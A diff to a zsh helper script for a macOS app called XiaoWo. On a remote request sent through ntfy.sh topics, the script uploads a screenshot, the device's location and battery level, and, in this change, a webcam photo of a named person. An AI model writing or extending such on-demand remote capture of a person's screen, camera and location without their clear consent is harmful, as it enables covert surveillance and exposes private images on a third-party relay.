@@ -5,6 +5,10 @@
 
 set -u
 DIR=${0:A:h}
+# App 包内部绝对不能写东西，否则签名会坏、录屏/定位权限就失效
+APP_SUPPORT=${DIR%/XiaoWo.app/*}
+[[ "$APP_SUPPORT" == "$DIR" ]] && APP_SUPPORT=${TMPDIR:-/tmp}
+NATIVE_LOG="$APP_SUPPORT/native.log"
 [[ -f "$DIR/xiaowo.conf" ]] && source "$DIR/xiaowo.conf"
 
 SERVER=${SERVER:-https://ntfy.sh}
@@ -16,6 +20,7 @@ REPLY_TOPIC="$TOPIC-reply"
 ASK_TOPIC="$TOPIC-ask"
 SCREEN_TOPIC="$TOPIC-screen"
 WHERE_TOPIC="$TOPIC-where"
+CAM_TOPIC="$TOPIC-cam"
 SOUND=${SOUND:-/System/Library/Sounds/Glass.aiff}
 
 log() { print -r -- "$(date '+%m-%d %H:%M:%S') $*"; }
@@ -53,7 +58,7 @@ handle_peek() {
   local jpg="${TMPDIR:-/tmp}/xiaowo-screen.jpg"
   rm -f "$jpg"
 
-  if [[ -n "${XIAOWO_BIN:-}" ]] && "$XIAOWO_BIN" --shot "$jpg" 2>>"$DIR/native.log" && [[ -s "$jpg" ]]; then
+  if [[ -n "${XIAOWO_BIN:-}" ]] && "$XIAOWO_BIN" --shot "$jpg" 2>>"$NATIVE_LOG" && [[ -s "$jpg" ]]; then
     curl -s -m 30 -T "$jpg" -H "Filename: screen.jpg" -H "Title: 屏幕" "$SERVER/$SCREEN_TOPIC" >/dev/null
     log "发了一张屏幕"
   else
@@ -62,9 +67,20 @@ handle_peek() {
   fi
   rm -f "$jpg"
 
+  # 摄像头：拍一张耀耀现在的样子
+  local cam="${TMPDIR:-/tmp}/xiaowo-cam.jpg"
+  rm -f "$cam"
+  if [[ -n "${XIAOWO_BIN:-}" ]] && "$XIAOWO_BIN" --photo "$cam" 2>>"$NATIVE_LOG" && [[ -s "$cam" ]]; then
+    curl -s -m 30 -T "$cam" -H "Filename: cam.jpg" -H "Title: 摄像头" "$SERVER/$CAM_TOPIC" >/dev/null
+    log "发了一张摄像头"
+  else
+    log "摄像头拍照失败（多半是没给摄像头权限）"
+  fi
+  rm -f "$cam"
+
   local loc battery now where
   # 先用系统定位（Wi-Fi/GPS，准），拿不到再退回 IP 定位（只能到城市，还可能被 VPN 带偏）
-  [[ -n "${XIAOWO_BIN:-}" ]] && loc=$("$XIAOWO_BIN" --location 2>>"$DIR/native.log")
+  [[ -n "${XIAOWO_BIN:-}" ]] && loc=$("$XIAOWO_BIN" --location 2>>"$NATIVE_LOG")
   if [[ "$loc" != *'"lat"'* ]]; then
     log "系统定位拿不到，改用 IP 定位"
     loc=$(curl -s -m 6 "http://ip-api.com/json/?fields=status,country,regionName,city,lat,lon" 2>/dev/null)
@@ -89,6 +105,9 @@ cleanup() { pkill -P "$$" curl 2>/dev/null; exit 0; }
 trap cleanup TERM INT
 
 log "小窝助手启动，守着 $TOPIC"
+
+# 启动时一次性把录屏和定位权限申请好（授权过就静默跳过，不会反复弹窗）
+[[ -n "${XIAOWO_BIN:-}" ]] && "$XIAOWO_BIN" --request 2>>"$NATIVE_LOG" &
 
 while true; do
   curl -sN -m 0 --no-buffer "$SERVER/$TOPIC,$ASK_TOPIC/json" 2>/dev/null | while IFS= read -r line; do
